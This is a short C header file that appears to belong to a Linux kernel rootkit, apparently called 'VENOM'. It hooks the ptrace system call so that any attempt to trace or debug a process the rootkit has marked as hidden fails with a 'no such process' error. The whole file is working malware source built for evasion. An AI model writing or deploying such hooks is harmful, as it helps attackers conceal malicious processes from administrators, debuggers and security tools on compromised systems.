#ifndef PTRACE_HACK_H
#define PTRACE_HACK_H

#include "../include/headers.h"


static asmlinkage long (*orig_ptrace)(const struct pt_regs *regs);

static asmlinkage long hooked_ptrace(const struct pt_regs *regs) {
    long request = regs->di;
    pid_t pid = (pid_t)regs->si;

    if (is_pid_hidden(pid)) {
        TLOG_WARN("[VENOM] Blocked ptrace on hidden PID %d", pid);
        return -ESRCH; 
    }
    
    return orig_ptrace(regs);
} 

#endif 
